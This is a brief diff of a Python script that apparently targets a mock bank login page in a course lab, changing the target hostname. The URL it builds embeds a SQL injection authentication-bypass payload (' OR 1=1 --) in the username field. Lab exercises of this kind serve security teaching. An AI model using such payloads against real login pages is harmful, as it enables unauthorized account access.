@@ -2,7 +2,7 @@ import os
 import random
 import string
 
-blue_server = "http://blue.usc-bank3.usc430/blue/login.php?user=<username>' OR 1=1 --&pass=<password>"
+blue_server = "http://blue.usc-bank2.usc430/blue/login.php?user=<username>' OR 1=1 --&pass=<password>"
 
 # Generate random cookie
 cookie = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
